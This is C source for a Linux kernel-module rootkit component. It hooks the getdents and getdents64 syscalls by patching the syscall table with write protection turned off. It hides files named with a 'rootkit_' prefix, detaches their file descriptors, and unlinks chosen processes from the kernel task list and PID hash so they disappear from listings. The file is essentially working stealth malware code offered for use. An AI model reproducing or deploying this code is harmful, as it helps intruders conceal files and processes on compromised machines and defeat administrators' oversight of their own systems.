#include "utils.h"
#include "getdents_hook.h"

/* counting accesses to fake getdents functions */
static int accesses_getdents = 0;
struct mutex lock_getdents;

/* hiding active */
static int file_hiding = 0;
static int proc_hiding = 0;

/* hidden file descriptors and processes */
struct data_node *filedescriptors = NULL;
struct data_node *processes = NULL;

/* pointer to original systemcalls */
asmlinkage int (*original_getdents) (unsigned int fd, 
	struct linux_dirent __user *dirp, unsigned int count);
asmlinkage int (*original_getdents64) (unsigned int fd, 
	struct linux_dirent64 __user *dirp, unsigned int count);

int has_prefix(char* filename)
{
	/* check whether filename hast prefix "rootkit_" or not */
	if(strstr(filename, "rootkit_") == filename) {
		debug("HIDING FILE \"%s\" (PREFIX MATCHING)", filename);
		return 1;
	}

	/* configuration file: special case */
	if(strstr(filename, ".rootkit_") == filename) {
		debug("HIDING FILE \"%s\" (PREFIX MATCHING)", filename);
		return 1;
	}

	return 0;
}

void insert_fd(struct data_node *head, struct fdtable *table, int fd, 
	struct file *file)
{
	/* create fd_node and insert data */
	struct fd_node *fn = kmalloc(sizeof(struct fd_node), GFP_KERNEL);

	debug("INSERT FILE DESCRIPTOR %d", fd);

	fn->table = table;
	fn->file = file;
	fn->fd = fd;

	/* insert into list */
	insert_data_node(&head, (void *)fn);
}

void remove_fd(struct data_node *node)
{
	/* delete node and extract data from node */
	struct fd_node *fn = (struct fd_node *)node->data;

	debug("REMOVE FILE DESCRIPTOR %d", fn->fd);

	/* insert fd back in table */
	fn->table->fd[fn->fd] = fn->file;

	/* free fd node */
	kfree(fn);
}

void find_fd(unsigned long inode)
{
	/* task struct for looping through processes */
	struct task_struct *task;

	for_each_process(task) {
		int i;

		/* accessing over files_struct */
		struct fdtable *table;
		struct files_struct *open_files = task->files;
		table = files_fdtable(open_files);

		for(i = 0; i < table->max_fds; i++) {
			/* get file from fd */
			struct file *file = table->fd[i];

			/* struct file and inode number don't match */
			if(file == NULL || file->f_inode->i_ino != inode)
				continue;

			/* backup our pointer */
			insert_fd(filedescriptors, table, i, table->fd[i]);

			/* remove reference to file descriptor */
			table->fd[i] = NULL;
		}
	}
}

struct data_node *find_process(int pid)
{
	if(!proc_hiding) {
		debug("PROCESS %d NOT FOUND IN LIST", pid);
		return NULL;
	}

	return find_data_node_field(&processes, (void *)&pid, 
		offsetof(struct proc_node, pid), sizeof(pid));
}

/* modified version of "hash_pid"
 * http://lxr.free-electrons.com/source/include/linux/sched.h?v=2.2.26#L473
 */
void hash_task(struct task_struct *task)
{
	int i;
	struct pid *pid = get_task_pid(task, PIDTYPE_PID);

	for(i = 0; i <= pid->level; i++) {
		/* get struct upid from "level" numbers + i */
		struct upid* upid = pid->numbers + i;

		/* insert entry */
		if(upid->pid_chain.next)
			*upid->pid_chain.next->pprev = &upid->pid_chain;

		*upid->pid_chain.pprev = &upid->pid_chain;
	}
}

/* modified version of "unhash_pid"
 * http://lxr.free-electrons.com/source/include/linux/sched.h?v=2.2.26#L483
 */
void unhash_task(struct task_struct *task)
{
	int i;
	struct pid *pid = get_task_pid(task, PIDTYPE_PID);

	/* since we have multiple levels of namespaces, we iterate through all 
	 * of them and hide the process in all namespaces so that the process 
	 * is not visible to anyone anymore.
	 */
	for(i = 0; i <= pid->level; i++) {
		/* get struct upid from "level" numbers + i */
		struct upid* upid = pid->numbers + i;

		/* remove entry */
		if(upid->pid_chain.next)
			upid->pid_chain.next->pprev = upid->pid_chain.pprev;

		*upid->pid_chain.pprev = upid->pid_chain.next;
	}
}

void show_task(struct data_node *node)
{
	/* delete node and extract data */
	struct proc_node *pn = (struct proc_node *)node->data;

	debug("UNHIDE PROCESS %d", pn->pid);

	/* insert task back into the list */
	pn->task->tasks.next->prev = &pn->task->tasks;
	pn->task->tasks.prev->next = &pn->task->tasks;

	/* insert task back in hash table */
	hash_task(pn->task);

	/* free proc node */
	kfree(pn);
}

void hide_task(struct task_struct* task, int pid)
{
	/* create proc_node and insert data */
	struct proc_node *pn = kmalloc(sizeof(struct proc_node), GFP_KERNEL);

	debug("HIDE PROCESS %d", pid);

	pn->pid = pid;
	pn->task = task;

	/* insert in list */
	insert_data_node(&processes, (void *)pn);

	/* link the surrounding tasks */
	task->tasks.prev->next = task->tasks.next;
	task->tasks.next->prev = task->tasks.prev;

	/* unhashes task from hash table */
	unhash_task(task);

	if(!proc_hiding)
		proc_hiding = !proc_hiding;
}



asmlinkage int fake_getdents(unsigned int fd, struct linux_dirent __user *dirp, 
	unsigned int count)
{
	/* return variable for original getdents */
	int ret;

	/* temporary variable for length of current linux_dirent and for 
	 * calculating the bytes we need to copy 
	 */
	int length_dirent, length_bytes;

	/* increase counter */
	inc_critical(&lock_getdents, &accesses_getdents);
	
	ret = original_getdents(fd, dirp, count);
	length_bytes = ret;
		
	while(length_bytes > 0) {
		int pid = strtoint(dirp->d_name);

		/* get length_bytes */
		length_dirent = dirp->d_reclen;
		length_bytes = length_bytes - length_dirent;
		
		if((file_hiding && has_prefix(dirp->d_name)) 
			|| (proc_hiding && pid && find_process(pid) != NULL)) {

			if(file_hiding) {
				unsigned long inode_number = dirp->d_ino;
				find_fd(inode_number);
			}

			/* move following linux_dirent to current linux_dirent 
			 * (overwrite) 
			 */
			memmove(dirp, (char *)dirp + dirp->d_reclen, 
				length_bytes);

			/* repeat until we moved all following linux_dirent one 
			 * place up the memory 
			 */
			ret -= length_dirent;

		}else if(length_bytes != 0) {
			/* set pointer to next linux_dirent entry and continue 
			 * loop 
			 */
			dirp = (struct linux_dirent *)((char *)dirp 
				+ dirp->d_reclen);
		}
	}
	
	/* decrement accesses_getdents counter */
	dec_critical(&lock_getdents, &accesses_getdents);

	return ret;
}

asmlinkage int fake_getdents64(unsigned int fd, 
	struct linux_dirent64 __user *dirp, unsigned int count) 
{
	/* return variable for original getdents */
	int ret;

	/* temporary variable for length of current linux_dirent and for 
	 * calculating the bytes we need to copy 
	 */
	int length_dirent, length_bytes;

	/* increase counter */
	inc_critical(&lock_getdents, &accesses_getdents);
	
	ret = original_getdents64(fd, dirp, count);

	length_bytes = ret;
		
	while(length_bytes > 0) {

		int pid = strtoint(dirp->d_name);

		/* get length_bytes */
		length_dirent = dirp->d_reclen;
		length_bytes = length_bytes - length_dirent;
		
		if((file_hiding && has_prefix(dirp->d_name)) 
			|| (proc_hiding && pid && find_process(pid) != NULL)) {

			if(file_hiding) {
				unsigned long inode_number = dirp->d_ino;
				find_fd(inode_number);
			}

			/* move following linux_dirent to current linux_dirent 
			 * (overwrite) 
			 */
			memmove(dirp, (char *)dirp + dirp->d_reclen, 
				length_bytes);

			/* repeat until we moved all following linux_dirent one 
			 * place up the memory 
			 */
			ret -= length_dirent;

		}else if(length_bytes != 0) {
			dirp = (struct linux_dirent64 *)((char *)dirp 
				+ dirp->d_reclen);
		}
	}
	
	/* decrement accesses_getdents counter */
	dec_critical(&lock_getdents, &accesses_getdents);

	return ret;
}

void file_hide(void)
{
	if(!file_hiding) {
		debug("FILE HIDING ENABLED");
		file_hiding = !file_hiding;
	}
}

void file_unhide(void)
{
	/* check for file hiding active */
	if(!file_hiding) {
		debug("FILE HIDING ALREADY DISABLED");
		return;
	}

	/* re-insert our removed file descriptors */
	free_data_node_list_callback(&filedescriptors, remove_fd);

	debug("FILE HIDING DISABLED");
	file_hiding = !file_hiding;
}

void process_hide(int pid)
{

	struct pid* pid_struct;
	struct task_struct* task;

	if(find_process(pid) != NULL) {
		debug("PROCESS %d ALREADY HIDDEN", pid);
		return;
	}

	/* find process by pid via hashtable */
	pid_struct = find_get_pid(pid);

	if(pid_struct == NULL)
		return;

	/* get task */
	task = pid_task(pid_struct, PIDTYPE_PID);
	debug("HIDE PROCESS %d", pid);
	hide_task(task, pid);
}

void process_unhide(int pid)
{
	struct data_node *node;

	if(!proc_hiding) {
		debug("PROCESS %d NOT HIDDEN", pid);
		return;
	}

	node = find_process(pid);

	if(node != NULL) {

		debug("UNHIDE PROCESS %d", pid);

		show_task(node);
		delete_data_node(&processes, node);

		/* check if any processes are hidden */
		if(processes == NULL && proc_hiding)
			proc_hiding = !proc_hiding;
	}
}

void process_pop(void)
{
	if(!proc_hiding) {
		debug("NO PROCESSES HIDDEN");
		return;
	}

	if(processes != NULL) {
		debug("POP PROCESS");
		show_task(processes);
		delete_data_node(&processes, processes);
	}

	/* check if any processes are hidden */
	if(processes == NULL && proc_hiding)
		proc_hiding = !proc_hiding;
}

void process_reset(void)
{
	debug("UNHIDE ALL HIDDEN PROCESSES");

	/* check for process hiding active */
	if(!proc_hiding) {
		debug("NO PROCESSES HIDDEN");
		return;
	}

	/* re-insert our removed file descriptors */
	free_data_node_list_callback(&processes, show_task);
	proc_hiding = !proc_hiding;
}

int hook_getdents_init(void)
{
	debug("INITIALIZE GETDENTS HOOK");

	/* initialize mutex */
	mutex_init(&lock_getdents);

	disable_page_protection();

	/* backing up the adress of the original getdents function */
	original_getdents = (void*) table_ptr[__NR_getdents];
	original_getdents64 = (void*) table_ptr[__NR_getdents64];

	/* switch original and fake read function */
	table_ptr[__NR_getdents] = (int*)fake_getdents;
	table_ptr[__NR_getdents64] = (int*)fake_getdents64;

	enable_page_protection();

	return 0;
}

void hook_getdents_exit(void)
{
	debug("EXIT GETDENTS HOOK");

	/* show all processes */
	process_reset();

	/* show all files */
	file_unhide();

	disable_page_protection();

	/* switch original and fake function back again (normal state) */
	table_ptr[__NR_getdents] = (int*)original_getdents;
	table_ptr[__NR_getdents64] = (int*)original_getdents64;

	enable_page_protection();

	/* prevent segfault when unloading */
	while(accesses_getdents > 0)
		msleep(50);
}

MODULE_LICENSE("GPL");